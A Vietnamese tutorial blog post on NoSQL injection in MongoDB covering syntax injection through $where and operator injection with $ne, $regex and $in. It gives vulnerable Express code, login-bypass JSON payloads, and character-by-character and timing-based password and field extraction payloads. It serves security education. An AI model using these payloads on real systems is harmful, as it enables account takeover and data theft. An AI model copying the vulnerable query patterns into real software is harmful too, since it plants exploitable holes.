---
layout: post
title: "NoSQL injection"
render_with_liquid: false
categories:
  - Web Security
  - Common Injection
tags:
  - nosql-injection
---

# NoSQL injection

Các ví dụ trong bài chỉ đặt trong bối cảnh học tập, lab, kiểm thử hợp pháp, hoặc hệ thống đã được ủy quyền.

## 1. Nền tảng NoSQL

NoSQL database là cơ sở dữ liệu lưu trữ và truy xuất dữ liệu theo định dạng khác với bảng quan hệ SQL truyền thống. Chúng thường được thiết kế để xử lý lượng lớn dữ liệu unstructured data (dữ liệu không có cấu trúc cố định) hoặc semi-structured data (dữ liệu bán cấu trúc), nên thường có ít relational constraints (ràng buộc quan hệ) và consistency checks (kiểm tra tính nhất quán) hơn SQL.

Ứng dụng vẫn tương tác với NoSQL database bằng query (truy vấn) được gửi từ application layer xuống database. Điểm khác biệt quan trọng là NoSQL không có một chuẩn chung tương đương SQL. Tùy công nghệ, query có thể dùng custom query language, XML, JSON, hoặc API riêng.

Một số model NoSQL phổ biến:

- Document stores: lưu dữ liệu trong document linh hoạt, bán cấu trúc, thường ở dạng JSON, BSON, hoặc XML. Dữ liệu được query qua API hoặc query language. Ví dụ: MongoDB, Couchbase.
- Key-value stores: lưu dữ liệu theo cặp key-value. Mỗi trường dữ liệu gắn với một key duy nhất, và value được truy xuất dựa trên key đó. Ví dụ: Redis, Amazon DynamoDB.
- Wide-column stores: tổ chức dữ liệu liên quan trong các column families linh hoạt thay vì row truyền thống. Ví dụ: Apache Cassandra, Apache HBase.
- Graph databases: dùng node để lưu entity và edge để lưu quan hệ giữa các entity. Ví dụ: Neo4j, Amazon Neptune.

Hiểu model và ngôn ngữ query của database giúp xác định cách kiểm thử injection phù hợp, vì payload phụ thuộc nhiều vào cú pháp và cấu trúc dữ liệu đang được xử lý.

## 2. NoSQL injection là gì

NoSQL injection là vulnerability (lỗ hổng) xảy ra khi người kiểm thử có thể can thiệp vào query mà ứng dụng gửi đến NoSQL database. Khi input của người dùng được đưa trực tiếp vào query mà không được xử lý đúng, input đó có thể làm thay đổi cú pháp, điều kiện lọc, hoặc operator của query.

Impact có thể bao gồm:

- Bypass authentication hoặc cơ chế bảo vệ.
- Extract hoặc edit data.
- Gây denial of service.
- Execute code trên server trong một số ngữ cảnh database/operator hỗ trợ đánh giá JavaScript.

Có hai nhóm chính:

- Syntax injection: phá vỡ cú pháp query NoSQL để chèn payload mới vào query.
- Operator injection: chèn NoSQL query operators để thao túng điều kiện query.

## 3. Syntax injection

Syntax injection xảy ra khi input có thể làm hỏng cú pháp query gốc, sau đó chèn thêm biểu thức hợp lệ để thay đổi logic. Cách tiếp cận tương tự SQL injection ở mức ý tưởng, nhưng payload thay đổi nhiều vì NoSQL database dùng nhiều ngôn ngữ query, kiểu cú pháp, và cấu trúc dữ liệu khác nhau.

Backend JavaScript vulnerable tương ứng thường có dạng nối trực tiếp input vào JavaScript expression trong `$where`:

```js
app.get("/product/lookup", async (req, res) => {
  const category = req.query.category;

  const products = await db.collection("products").find({
    $where: "this.category == '" + category + "' && this.released == 1",
  }).toArray();

  res.json(products);
});
```

Với kiểu triển khai này, `category` không còn chỉ là dữ liệu. Nó trở thành một phần của expression, nên ký tự quote, boolean condition, null character, hoặc JavaScript expression bổ sung có thể làm thay đổi query được database đánh giá.

### 3.1. Detect bằng lỗi cú pháp

Cách kiểm thử cơ bản là gửi fuzz strings và special characters vào từng input để xem database error hoặc hành vi khác thường có xuất hiện không. Nếu biết database hoặc API language phía sau, dùng ký tự đặc biệt phù hợp với ngôn ngữ đó. Nếu chưa biết, dùng nhiều fuzz strings để bao phủ nhiều kiểu API language.

Ví dụ với MongoDB, một ứng dụng lọc sản phẩm theo category có request:

```http
GET /product/lookup?category=fizzy
```

Ứng dụng có thể tạo query tương tự:

```js
this.category == 'fizzy'
```

Một fuzz string dùng để thử phá cú pháp MongoDB:

```text
'"`{ ;
$Foo}
$Foo \xYZ
```

Khi payload đi qua URL, cần URL-encode:

```text
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Khi payload đi trong JSON property, cùng ý tưởng có thể được biểu diễn ở dạng:

```text
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Nếu response thay đổi so với request hợp lệ ban đầu, đó có thể là dấu hiệu input chưa được filter hoặc sanitize đúng. Payload cần điều chỉnh theo context; nếu sai context, ứng dụng có thể chặn ở validation layer trước khi query được thực thi.

### 3.2. Xác định ký tự được xử lý

Sau khi thấy dấu hiệu bất thường, thử từng ký tự riêng lẻ để xác định ký tự nào được database hoặc query engine diễn giải như cú pháp.

Ví dụ gửi ký tự `'` có thể biến query thành:

```js
this.category == '''
```

Nếu response thay đổi, ký tự `'` có thể đã phá cú pháp query và gây syntax error. Có thể xác nhận bằng cách gửi một chuỗi hợp lệ hơn, chẳng hạn escape quote:

```js
this.category == '\''
```

Nếu phiên bản escape không gây syntax error, ứng dụng có thể đang xử lý input theo cách cho phép injection.

### 3.3. Xác nhận boolean condition

Khi đã xác định có thể tác động đến cú pháp, bước tiếp theo là kiểm tra xem payload có thay đổi boolean condition (điều kiện đúng/sai) trong query hay không.

Ví dụ với tham số `category`, gửi hai request:

```text
fizzy' && 0 && 'x
```

```text
fizzy' && 1 && 'x
```

Nếu false condition làm response khác đi nhưng true condition vẫn trả về gần giống request hợp lệ, điều đó cho thấy phần syntax được chèn đã ảnh hưởng đến server-side query.

### 3.4. Ghi đè điều kiện có sẵn

Khi boolean condition có thể bị điều khiển, payload có thể ghi đè logic lọc hiện tại bằng một điều kiện luôn đúng:

```text
fizzy'||'1'=='1
```

Query có thể trở thành:

```js
this.category == 'fizzy'||'1'=='1'
```

Vì điều kiện chèn vào luôn đúng, query có thể trả về tất cả item, bao gồm cả category ẩn hoặc chưa biết.

Cần cẩn thận khi dùng điều kiện luôn đúng trong lab hoặc kiểm thử được ủy quyền. Một request có thể được ứng dụng dùng lại trong nhiều query khác nhau; nếu input này đi vào thao tác update hoặc delete, điều kiện luôn đúng có thể gây thay đổi hoặc mất dữ liệu ngoài ý muốn.

### 3.5. Bỏ qua điều kiện phía sau bằng null character

MongoDB có thể bỏ qua phần sau null character. Nếu query gốc có thêm điều kiện `released`:

```js
this.category == 'fizzy' && this.released == 1
```

Payload:

```text
fizzy'%00
```

có thể tạo query:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

Nếu phần sau null character bị bỏ qua, điều kiện `this.released == 1` không còn được áp dụng. Kết quả là sản phẩm trong category đó có thể được hiển thị cả khi chưa released.

### 3.6. Extract data bằng syntax injection

Một số NoSQL database operator hoặc function có thể chạy JavaScript trong query, chẳng hạn MongoDB `$where` operator và `mapReduce()` function. Nếu ứng dụng vulnerable sử dụng các operator/function này, database có thể đánh giá JavaScript như một phần của query.

Backend JavaScript vulnerable tương ứng là user lookup dùng `$where` và nối username vào expression:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  const user = await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  if (!user) {
    return res.status(404).send("Could not find user");
  }

  res.json({
    username: user.username,
    role: user.role,
  });
});
```

Ở đây response khác nhau giữa user tồn tại và không tồn tại tạo điều kiện cho boolean-based extraction. Khi payload chèn thêm điều kiện trên `this.password`, backend vẫn chỉ trả thông tin hạn chế, nhưng khác biệt response đủ để suy luận từng ký tự.

Ví dụ user lookup nhận:

```http
GET /user/lookup?username=admin
```

Query phía sau có thể là:

```json
{"$where":"this.username == 'admin'"}
```

Vì query dùng `$where`, có thể thử chèn JavaScript expression để suy luận dữ liệu nhạy cảm qua response.

Ví dụ kiểm tra ký tự đầu tiên của password:

```text
admin' && this.password[0] == 'a' || 'a'=='b
```

Nếu response cho biết điều kiện đúng, có thể lặp lại theo từng vị trí để extract password từng ký tự.

Có thể dùng `match()` để kiểm tra pattern:

```text
admin' && this.password.match(/\d/) || 'a'=='b
```

Payload này giúp xác định password có chứa digit (chữ số) hay không.

### 3.7. Xác định field name bằng candidate

MongoDB xử lý semi-structured data và không yêu cầu fixed schema (schema cố định), nên trước khi extract data có thể cần xác định field hợp lệ trong collection.

Để kiểm tra field `password` có tồn tại không:

```text
admin' && this.password!='
```

Gửi lại payload tương tự với field đã biết tồn tại và field không tồn tại:

```text
admin' && this.username!='
```

```text
admin' && this.foo!='
```

Nếu response của `password` giống field tồn tại như `username`, nhưng khác field không tồn tại như `foo`, có thể suy ra field `password` tồn tại. Khi cần thử nhiều field name, có thể dùng dictionary attack với wordlist field name.

### 3.8. Extract tên field ẩn bằng `Object.keys(this)`

Trong JavaScript expression context mà `this` trỏ tới document hiện tại, có thể dùng `Object.keys(this)` để lấy danh sách field name của document. Phương pháp này cần boolean oracle: response phải khác nhau giữa điều kiện true và false.

Đầu tiên, xác định độ dài field name ở một index cụ thể:

```text
admin' && Object.keys(this)[1].length == 8 || 'a'=='b
```

Sau đó kiểm tra từng ký tự bằng regex trong JavaScript:

```text
admin' && Object.keys(this)[1].match(/^.{0}p/) || 'a'=='b
```

Payload tổng quát khi dùng Intruder hoặc một cơ chế brute-force tương tự:

```text
admin' && Object.keys(this)[§fieldIndex§].match(/^.{§position§}§char§/) || 'a'=='b
```

Trong đó:

- `fieldIndex`: vị trí field trong `Object.keys(this)`.
- `position`: vị trí ký tự trong tên field.
- `char`: ký tự đang thử.

Khi đã biết tên field ẩn, có thể chuyển sang extract giá trị của field đó:

```text
admin' && this["FIELD_NAME"].match(/^a/) || 'a'=='b
```

Điểm cần phân biệt: `Object.keys(this)[n].match(...)` trong phần này là JavaScript expression được chèn qua syntax injection. Nó khác với operator injection dạng JSON như `{"$regex":"^a"}`.

### 3.9. Extract dữ liệu field theo index

Nếu đã biết vị trí field trong `Object.keys(this)` nhưng chưa biết tên field, vẫn có thể đọc giá trị bằng bracket notation (truy cập thuộc tính bằng biểu thức trong `[]`). Kỹ thuật này hữu ích khi chỉ cần extract value của field ở một index cụ thể, không cần khôi phục field name trước.

Ví dụ xác định độ dài value của field ở index `2`:

```text
administrator' && this[Object.keys(this)[2]].length > 1 && '1'=='1
```

Trong đó `Object.keys(this)[2]` trả về tên field ở index `2`, rồi `this[...]` đọc value của field đó.

Sau khi biết độ dài hoặc khoảng độ dài, có thể kiểm tra từng ký tự bằng `match()`:

```text
administrator' && this[Object.keys(this)[2]].match(/^.{0}p/) && '1'=='1
```

Payload trên kiểm tra ký tự ở vị trí `0` của value có phải `p` hay không. Payload tổng quát:

```text
administrator' && this[Object.keys(this)[§fieldIndex§]].match(/^.{§position§}§char§/) && '1'=='1
```

Trong đó:

- `fieldIndex`: vị trí field trong `Object.keys(this)`.
- `position`: vị trí ký tự trong value.
- `char`: ký tự đang thử.

### 3.10. Timing-based syntax injection

Đôi khi database error không tạo khác biệt rõ ràng trong response body. Khi đó có thể phát hiện và khai thác bằng JavaScript injection gây conditional time delay (độ trễ có điều kiện).

Backend JavaScript vulnerable tương ứng vẫn là `$where` nhận expression có chứa input:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  const user = await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  res.status(user ? 200 : 404).end();
});
```

Nếu response body không khác biệt đủ rõ, payload có thể tạo delay khi điều kiện đúng. Khi thời gian phản hồi thay đổi so với baseline, người kiểm thử có tín hiệu để xác định expression đã được evaluate.

Quy trình:

1. Load page nhiều lần để xác định baseline loading time.
2. Chèn timing-based payload vào input. Payload gây delay có chủ đích khi được thực thi.
3. Quan sát response có chậm hơn baseline hay không. Nếu có, đó là dấu hiệu injection thành công.

Ví dụ payload gây delay nếu ký tự đầu của password là `a`:

```text
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```text
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

### 3.11. Giới hạn của Syntax injection

Các giới hạn của Syntax injection xuất phát từ context mà input được chèn vào. Kỹ thuật này cần backend biến input thành một phần của query expression.

Ví dụ backend vulnerable:

```js
app.get("/product/lookup", async (req, res) => {
  const category = req.query.category;

  const products = await db.collection("products").find({
    $where: "this.category == '" + category + "' && this.released == 1",
  }).toArray();

  res.json(products);
});
```

Trong code này, payload như `fizzy'||'1'=='1` có thể đóng chuỗi `category`, chèn boolean expression mới, rồi làm thay đổi logic của `$where`.

Ngược lại, nếu backend dùng structured query và input chỉ là value của field, payload syntax không có cú pháp gốc để phá:

```js
app.get("/product/lookup", async (req, res) => {
  const category = req.query.category;

  const products = await db.collection("products").find({
    category: category,
    released: 1,
  }).toArray();

  res.json(products);
});
```

Trong code này, chuỗi `fizzy'||'1'=='1` chỉ là giá trị literal của field `category`. Nó không được nối vào JavaScript expression, nên không thể đóng quote, không thể dùng null character để bỏ phần `released`, và không chạy được `Object.keys(this)` hay `sleep(5000)`.

Một giới hạn khác là các kỹ thuật dùng `Object.keys(this)`, `this[Object.keys(this)[n]]`, `match()`, hoặc `sleep(5000)` cần JavaScript context mà `this` là document hiện tại:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  const user = await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  res.status(user ? 200 : 404).end();
});
```

Với code này, payload có thể chèn thêm expression như `this.password.match(/^p/)` hoặc `Object.keys(this)[1].match(/^p/)`. Nếu backend không dùng `$where` hoặc cơ chế tương đương để evaluate JavaScript trên document, các expression đó chỉ là text.

Cuối cùng, extraction cần oracle. Nếu backend luôn trả response giống nhau cho cả nhánh đúng và sai, boolean-based extraction không có tín hiệu:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  res.status(200).json({ message: "OK" });
});
```

Trong trường hợp này, điều kiện đúng/sai không tạo khác biệt trong status code hoặc body. Timing-based extraction chỉ còn dùng được nếu payload tạo delay ổn định và môi trường phản hồi đủ ổn định để phân biệt với baseline.

## 4. Operator injection

NoSQL query operators là các operator dùng để chỉ định điều kiện mà document phải thỏa mãn để được đưa vào kết quả query. Trong MongoDB, một số operator thường gặp gồm:

- `$where`: match document thỏa mãn một JavaScript expression.
- `$ne`: match mọi giá trị không bằng giá trị được chỉ định.
- `$in`: match mọi giá trị nằm trong array được chỉ định.
- `$regex`: chọn document có value khớp với regular expression.

Operator injection xảy ra khi input cho phép chèn các operator này vào query. Cách kiểm thử là gửi có hệ thống nhiều operator vào nhiều input khác nhau, sau đó quan sát error message hoặc khác biệt response.

Có hai kiểu cần tách rõ:

- Parameter-scoped operator injection: attacker chỉ điều khiển operator bên trong một hoặc nhiều tham số cụ thể, ví dụ `username` hoặc `password`.
- Top-level query operator injection: attacker điều khiển query object ở cấp root, nên có thể thêm operator top-level như `$where`.

### 4.1. Parameter-scoped operator injection

Parameter-scoped operator injection xảy ra khi backend giữ cấu trúc query cố định, nhưng đưa trực tiếp từng value từ request vào từng field của query mà không ép kiểu về string.

Backend JavaScript vulnerable:

```js
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne({
    username: req.body.username,
    password: req.body.password,
  });

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Ở kiểu này, attacker không điều khiển cả query object. Attacker chỉ làm cho `req.body.username` hoặc `req.body.password` không còn là string, mà trở thành object chứa operator như `{"$ne":"invalid"}` hoặc `{"$regex":"^.*"}`.

#### 4.1.1. Đưa operator vào từng tham số

Trong JSON request, operator có thể được chèn dưới dạng nested object:

```json
{"username":"wiener"}
```

có thể được thử thành:

```json
{"username":{"$ne":"invalid"}}
```

Với input dạng URL parameter, operator có thể được biểu diễn trong parameter name:

```text
username[$ne]=invalid
```

Nếu cách này không hoạt động, có thể thử:

1. Chuyển request method từ `GET` sang `POST`.
2. Đổi `Content-Type` thành `application/json`.
3. Đưa JSON vào request body.
4. Chèn operator trong JSON.

Một công cụ chuyển đổi Content-Type có thể hỗ trợ tự động đổi URL-encoded `POST` request sang JSON khi kiểm thử trong lab.

#### 4.1.2. Detect trên từng tham số

Ví dụ một login endpoint nhận JSON body:

```json
{"username":"wiener","password":"peter"}
```

Để kiểm tra input `username` có xử lý operator hay không:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Nếu `$ne` được áp dụng, query sẽ tìm user có `username` không bằng `invalid`.

Có thể kiểm tra thêm `$regex` trên cùng tham số:

```json
{"username":{"$regex":"wien.*"},"password":"peter"}
```

Nếu response vẫn tương ứng với user `wiener`, tham số `username` đang xử lý operator.

#### 4.1.3. Xác định phạm vi điều khiển tham số

Cần kiểm tra từng field riêng lẻ để biết attacker điều khiển operator ở một field hay nhiều field. Ví dụ chỉ kiểm tra `password`:

```json
{"username":"administrator","password":{"$ne":"invalid"}}
```

Nếu request này thành công nhưng `username` không nhận object operator, phạm vi điều khiển chỉ nằm ở `password`. Nếu cả `username` và `password` đều nhận object operator, impact thường rộng hơn vì có thể loại bỏ nhiều điều kiện xác thực cùng lúc.

#### 4.1.4. Bypass authentication

Nếu cả `username` và `password` đều xử lý operator, authentication có thể bị bypass:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Query này trả về các credential có `username` và `password` đều không bằng `invalid`. Kết quả có thể là đăng nhập vào account đầu tiên trong collection.

Nếu chỉ `password` xử lý operator, có thể kết hợp username cố định với password condition:

```json
{"username":"administrator","password":{"$ne":"invalid"}}
```

Query này chỉ còn yêu cầu username đúng và password không bằng chuỗi `invalid`.

#### 4.1.5. Nhắm vào account cụ thể

Để nhắm vào account cụ thể khi đã biết hoặc đoán được username:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Hoặc dùng `$regex` để match username theo prefix:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

#### 4.1.6. Xác định length của field đã biết bằng `$regex`

Nếu field cần extract đã biết và field đó xử lý `$regex`, có thể xác định độ dài bằng regex. Ví dụ kiểm tra password dài đúng 8 ký tự:

```json
{"username":"administrator","password":{"$regex":"^.{8}$"}}
```

Hoặc kiểm tra password có dài hơn một ngưỡng:

```json
{"username":"administrator","password":{"$regex":"^.{9,}$"}}
```

Response khác nhau giữa regex đúng và sai tạo boolean oracle cho độ dài.

#### 4.1.7. Extract data trên field đã biết bằng `$regex`

Với Parameter-scoped operator injection, nếu field cần extract đã biết và tham số đó xử lý `$regex`, có thể brute-force từng ký tự của value bằng regex.

Ví dụ field đã biết là `password`:

```json
{"username":"administrator","password":{"$regex":"^a"}}
```

Nếu response cho biết điều kiện đúng, ký tự đầu tiên của password là `a`. Tiếp tục mở rộng prefix:

```json
{"username":"administrator","password":{"$regex":"^pa"}}
```

Payload tổng quát:

```json
{"username":"administrator","password":{"$regex":"^KNOWN_PREFIX§char§"}}
```

#### 4.1.8. Blind response-based extraction

Khi ứng dụng không trả trực tiếp dữ liệu, vẫn có thể dùng khác biệt response làm oracle. Ví dụ nếu regex đúng thì login thành công hoặc response length khác, còn regex sai thì trả `Invalid username or password`, có thể lặp lại từng ký tự:

```json
{"username":"administrator","password":{"$regex":"^p"}}
```

```json
{"username":"administrator","password":{"$regex":"^q"}}
```

Ký tự nào tạo response thuộc nhánh đúng thì được giữ lại làm prefix cho vòng tiếp theo.

#### 4.1.9. Blind timing chỉ dựa trên field-level operator

Với Parameter-scoped operator injection, attacker không tự tạo được delay có chủ đích bằng JavaScript. Nếu response body bị làm giống nhau, thứ duy nhất có thể quan sát là chênh lệch thời gian tự nhiên giữa các field-level condition đang kiểm soát, ví dụ regex khớp và regex không khớp:

```json
{"username":"administrator","password":{"$regex":"^p"}}
```

```json
{"username":"administrator","password":{"$regex":"^z"}}
```

Nếu môi trường tạo độ lệch thời gian ổn định giữa điều kiện đúng và sai, độ lệch đó có thể dùng như blind timing oracle. Đây là tín hiệu quan sát từ field-level condition, không phải JavaScript delay do payload điều khiển.

#### 4.1.10. Giới hạn của Parameter-scoped operator injection

Điểm cần nhìn đầu tiên là query thật sự đi vào database. Với Parameter-scoped operator injection, backend không đưa nguyên `req.body` vào `findOne()`. Nó tự dựng query mới từ một số field cố định:

```js
app.post("/login", async (req, res) => {
  const query = {
    username: req.body.username,
    password: req.body.password,
  };

  const user = await db.collection("users").findOne(query);

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Vì vậy attacker chỉ điều khiển được value của các field đã được backend chọn, ở đây là `username` và `password`.

Request này có hiệu lực vì nó thay value của field `password`:

```json
{"username":"administrator","password":{"$ne":"invalid"}}
```

Query thật sự đi vào database:

```js
{
  username: "administrator",
  password: { $ne: "invalid" },
}
```

Đây là lý do Parameter-scoped operator injection vẫn có thể bypass hoặc extract field đã biết bằng `$regex`, miễn là field đó đã nằm trong query shape.

Giới hạn thứ nhất: thêm key mới ở root của request không có nghĩa là key đó đi vào database. Ví dụ request có thêm `$where`:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
```

Nhưng backend không đọc `req.body.$where`, nên query thật sự vẫn chỉ có hai field:

```js
{
  username: "administrator",
  password: { $ne: "invalid" },
}
```

Kết luận: không thêm được top-level `$where`, `resetToken`, `role`, hoặc bất kỳ field mới nào nếu backend không đưa field đó vào query.

Giới hạn thứ hai: đặt `$where` bên trong một field không biến nó thành `$where` ở cấp root.

```json
{"username":"administrator","password":{"$where":"sleep(5000)"}}
```

Query thật sự:

```js
{
  username: "administrator",
  password: { $where: "sleep(5000)" },
}
```

Ở đây `$where` là một object nằm dưới field `password`, không phải operator ở root của query. Nó không tạo JavaScript context trên document, nên không chạy được `sleep(5000)` và không có `this` để đọc.

Giới hạn thứ ba: `$regex` chỉ evaluate regular expression, không evaluate JavaScript. Payload sau không chạy `Object.keys(this)`:

```json
{"username":"administrator","password":{"$regex":"Object.keys(this)[1].match(/^p/)"}}
```

Query thật sự:

```js
{
  username: "administrator",
  password: { $regex: "Object.keys(this)[1].match(/^p/)" },
}
```

Database dùng chuỗi trong `$regex` làm pattern để so với value của `password`. Nó không coi chuỗi này là JavaScript expression, nên `Object.keys(this)` không chạy và không thể liệt kê field ẩn.

Giới hạn thứ tư: không extract được field ẩn nếu field đó không nằm trong query shape. Ví dụ request có thêm `resetToken`:

```json
{"username":"administrator","password":{"$ne":"invalid"},"resetToken":{"$regex":"^a"}}
```

Query thật sự vẫn là:

```js
{
  username: "administrator",
  password: { $ne: "invalid" },
}
```

`resetToken` bị bỏ qua vì backend không đọc `req.body.resetToken`. Muốn dùng `$regex` để extract một field bằng Parameter-scoped operator injection, field đó phải được backend đưa vào query, ví dụ `password: req.body.password`.

Giới hạn thứ năm: không tạo được timing oracle chủ động bằng JavaScript. Payload `sleep(5000)` cần JavaScript context như top-level `$where`; Parameter-scoped thuần túy không có vị trí để chèn context đó. Timing chỉ còn là chênh lệch tự nhiên giữa các field-level condition, ví dụ regex khớp và không khớp, nên chỉ dùng được nếu môi trường tạo độ lệch ổn định.

Tóm lại, các kỹ thuật sau không áp dụng cho Parameter-scoped operator injection thuần túy:

- Không thêm được top-level `$where`, vì `$where` phải nằm cùng cấp với `username` và `password`, không nằm bên trong value của một field.
- Không dùng được `Object.keys(this)` hoặc `this[Object.keys(this)[n]]`, vì các expression này cần JavaScript context do `$where` cung cấp.
- Không tạo được delay chủ động kiểu `$where:"sleep(5000)"`, vì không có quyền chèn `$where` ở root.
- Không có timing oracle chủ động; chênh lệch thời gian giữa field-level condition đúng/sai chỉ dùng được nếu môi trường tạo độ lệch ổn định.
- Không extract được tên field ẩn bằng JavaScript introspection; chỉ có thể extract các field đã biết và được map thành tham số có thể điều khiển.

Những kỹ thuật này thuộc Top-level query operator injection, nơi backend dùng dạng:

```js
findOne(req.body);
```

### 4.2. Top-level query operator injection

Top-level query operator injection xảy ra khi backend đưa nguyên object do người dùng gửi vào query. Lúc này attacker có thể điều khiển gần như toàn bộ query object, bao gồm cả các operator ở cấp root như `$where`.

Backend JavaScript vulnerable tương ứng là đưa toàn bộ JSON body vào query:

```js
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne(req.body);

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  if (user.locked) {
    return res.status(403).send("Account locked");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Vì backend dùng nguyên `req.body`, request có thể thêm top-level operator như `$where`. Khác biệt response giữa `Invalid username or password` và `Account locked` tạo tín hiệu để kiểm tra JavaScript expression, extract field name bằng `Object.keys(this)`, hoặc extract token value từng ký tự.

#### 4.2.1. Đưa operator vào query object

Vì toàn bộ `req.body` trở thành query, payload có thể chứa cả field condition và top-level operator:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

Khác với Parameter-scoped operator injection, attacker có thể thêm key ở cấp root thay vì chỉ thay đổi value của `username` hoặc `password`.

#### 4.2.2. Detect bằng `$where`

Với login request:

```json
{"username":"wiener","password":"peter"}
```

Thêm `$where` như một parameter bổ sung và so sánh false/true condition:

```json
{"username":"wiener","password":"peter","$where":"0"}
```

```json
{"username":"wiener","password":"peter","$where":"1"}
```

Nếu response khác nhau, JavaScript expression trong `$where` có thể đang được evaluate.

#### 4.2.3. Xác định phạm vi điều khiển query object

Có thể xác nhận quyền điều khiển ở cấp root bằng cách thêm một key top-level không phải field dữ liệu thông thường:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
```

Nếu `$where:"0"` làm response đổi khác so với `$where:"1"`, payload đang được xử lý ở cấp query object chứ không chỉ ở một field cụ thể.

#### 4.2.4. Bypass bằng field operator và top-level condition

Top-level query operator injection vẫn có thể dùng field operator như `$ne` hoặc `$regex`, vì attacker đang kiểm soát toàn bộ object:

```json
{"username":"carlos","password":{"$ne":"invalid"}}
```

Sau đó có thể thêm `$where` để ràng buộc hoặc quan sát điều kiện bổ sung:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

Nếu `$where:"1"` và `$where:"0"` tạo response khác nhau, có thể dùng nhánh này cho các kỹ thuật JavaScript introspection.

#### 4.2.5. Nhắm vào account cụ thể

Có thể cố định username, dùng operator trên password, rồi thêm `$where` nếu cần điều kiện bổ sung:

```json
{"username":"administrator","password":{"$ne":""},"$where":"1"}
```

Hoặc match username bằng `$regex`:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""},"$where":"1"}
```

#### 4.2.6. Extract field name bằng `Object.keys()`

Khi đã chèn được operator cho phép chạy JavaScript, có thể dùng `Object.keys()` để extract tên field.

Ví dụ:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

Payload này kiểm tra field đầu tiên của object hiện tại và so khớp ký tự đầu tiên của field name. Bằng cách thay đổi index field, vị trí ký tự, và ký tự thử, có thể extract field name từng ký tự.

#### 4.2.7. Extract data bằng field name đã biết

Khi biết field name, có thể dùng `$where` để kiểm tra value của field đó:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"this.password.match(/^p/)"}
```

Nếu điều kiện đúng và sai tạo response khác nhau, có thể brute-force từng ký tự của value.

#### 4.2.8. Extract dữ liệu field theo index

Nếu chưa biết tên field nhưng biết index trong `Object.keys(this)`, có thể dùng `this[Object.keys(this)[n]]` để đọc value của field đó.

Ví dụ xác định độ dài value của field ở index `2`:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[2]].length > 1"}
```

Sau đó kiểm tra từng ký tự bằng `match()`:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[2]].match(/^.{0}p/)"}
```

Payload tổng quát:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[FIELD_INDEX]].match(/^.{POSITION}CHAR/)"}
```

#### 4.2.9. Extract data bằng `$regex`

Trong Top-level query operator injection, `$regex` vẫn có thể dùng trên field đã biết giống Parameter-scoped operator injection. Ví dụ:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Nếu response khác với response khi gửi password sai, ứng dụng có thể vulnerable. Sau đó có thể dùng `$regex` để kiểm tra dữ liệu từng ký tự:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

#### 4.2.10. Blind time-based attack bằng `$where`

Timing-based operator injection dùng cùng ý tưởng delay có điều kiện, nhưng payload được gửi dưới dạng NoSQL operator trong JSON thay vì phá chuỗi JavaScript expression trong một parameter.

Khi ứng dụng không tạo khác biệt rõ ràng trong response body, có thể thử chèn `$where` để tạo delay:

```json
{"username":"admin","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
```

Nếu response chậm hơn baseline, điều đó cho thấy `$where` đã được xử lý như một operator và JavaScript expression đã được evaluate.

Để biến delay thành boolean oracle, đặt điều kiện vào `$where`. Ví dụ kiểm tra ký tự đầu tiên của password:

```json
{"username":"admin","password":{"$ne":"invalid"},"$where":"function(){if(this.password[0]==='a'){sleep(5000)};return true;}"}
```

Nếu request chỉ chậm khi ký tự đang thử đúng, có thể lặp lại theo từng vị trí và từng ký tự. Khác với timing-based syntax injection, payload ở đây không cần đóng quote của input; nó thêm operator mới vào JSON query.

#### 4.2.11. Giới hạn của Top-level query operator injection

Với Top-level query operator injection, query thật sự đi vào database thường chính là `req.body`:

```js
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne(req.body);

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Request có thêm `$where` ở root:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match(/^p/)"}
```

Query thật sự cũng có `$where` ở root:

```js
{
  username: "administrator",
  password: { $ne: "invalid" },
  $where: "Object.keys(this)[1].match(/^p/)",
}
```

